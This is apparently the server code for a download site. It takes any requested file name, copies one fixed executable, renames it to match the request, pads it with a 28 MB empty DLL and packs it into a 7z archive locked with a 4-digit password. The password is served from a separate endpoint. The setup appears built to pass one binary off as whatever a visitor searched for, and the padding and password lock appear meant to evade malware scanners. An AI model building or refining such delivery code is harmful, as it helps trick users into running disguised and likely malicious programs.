from flask import Flask, request, send_file, jsonify
from flask_cors import CORS   # <— NEU
import py7zr, tempfile, os, random, string, shutil

app = Flask(__name__)

# Erlaube Anfragen NUR von deiner Netlify-Domain:
CORS(app, resources={r"/*": {"origins": "https://save-drop.netlify.app"}})  # <— NEU
# (falls du zusätzlich lokal testen willst: CORS(app))

EXE_FILE = "base.exe"
DUMMY_DLL = "dummy.dll"
PASSWORD_STORE = "/tmp/passwords"
os.makedirs(PASSWORD_STORE, exist_ok=True)

def generate_password():
    return ''.join(random.choices(string.digits, k=4))

def ensure_dummy_dll(path, size_mb=28):
    """Erzeuge DLL, falls nicht vorhanden (28 MB)."""
    if not os.path.exists(path):
        with open(path, "wb") as f:
            f.write(b"\0" * size_mb * 1024 * 1024)

@app.route('/download/<path:filename>')
def download(filename):
    keyword = filename.rsplit('.', 1)[0].replace('+', ' ')
    password = generate_password()

    # Prüfe, ob die Basis-EXE existiert
    if not os.path.exists(EXE_FILE):
        return jsonify({"error": "base.exe not found on server"}), 500

    # Stelle sicher, dass es die DLL gibt
    ensure_dummy_dll(DUMMY_DLL, size_mb=28)

    with tempfile.TemporaryDirectory() as tmpdir:
        zip_path = os.path.join(tmpdir, f"{keyword}.7z")
        exe_dest = os.path.join(tmpdir, f"{keyword}.exe")
        dll_dest = os.path.join(tmpdir, DUMMY_DLL)

        shutil.copy(EXE_FILE, exe_dest)
        shutil.copy(DUMMY_DLL, dll_dest)

        with py7zr.SevenZipFile(zip_path, 'w', password=password) as archive:
            archive.write(exe_dest, arcname=f"{keyword}.exe")
            archive.write(dll_dest, arcname=DUMMY_DLL)

        with open(os.path.join(PASSWORD_STORE, f"{keyword}.txt"), "w") as f:
            f.write(password)

        # send_file setzt Content-Disposition (Dateiname) korrekt
        return send_file(zip_path, as_attachment=True, download_name=f"{keyword}.7z")

@app.route('/get-password')
def get_password():
    file = request.args.get("file", "").replace('+', ' ').rsplit('.', 1)[0]
    pw_path = os.path.join(PASSWORD_STORE, f"{file}.txt")
    if os.path.exists(pw_path):
        with open(pw_path, "r") as f:
            return jsonify({"password": f.read().strip()})
    return jsonify({"password": "error"})

@app.route('/')
def hello():
    return "API is running."